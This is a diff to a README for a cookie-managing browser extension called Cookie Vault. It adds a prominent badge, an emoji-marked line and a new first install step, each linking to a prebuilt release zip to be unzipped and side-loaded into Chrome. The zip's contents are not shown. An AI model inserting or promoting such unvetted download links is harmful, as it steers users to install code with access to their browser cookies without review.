@@ -9,6 +9,14 @@ your device.
 [![Chrome Web Store](https://img.shields.io/chrome-web-store/v/YOUR_EXTENSION_ID)](https://chromewebstore.google.com/detail/YOUR_EXTENSION_ID)
 -->
 
+<p align="center">
+  <a href="https://github.com/marufhossainkeyas11/Cookie-Vault/releases/download/COOKIE-VAULT/cookie-vault-extension.zip">
+    <img alt="Download Cookie Vault" src="https://img.shields.io/badge/⬇%20Download-cookie--vault--extension.zip-2ea44f?style=for-the-badge">
+  </a>
+</p>
+
+<p align="center"><b>🔥 <a href="https://github.com/marufhossainkeyas11/Cookie-Vault/releases/download/COOKIE-VAULT/cookie-vault-extension.zip">Grab the latest build here</a> — unzip it, then follow "Installing" below to load it into Chrome. 🔥</b></p>
+
 ![Cookie Vault screenshot](store-assets/screenshot-1280x800.png)
 
 ## Features
@@ -40,6 +48,7 @@ your device.
 
 ### Manually, for development or testing
 
+0. **[⬇ Download the extension zip](https://github.com/marufhossainkeyas11/Cookie-Vault/releases/download/COOKIE-VAULT/cookie-vault-extension.zip)** and unzip it — or clone the repo instead if you'd rather build from source.
 1. Clone this repo.
 2. Open `chrome://extensions` in Chrome (or `about:debugging#/runtime/this-firefox` in Firefox).
 3. Enable **Developer mode** (Chrome) — the toggle is in the top-right corner.
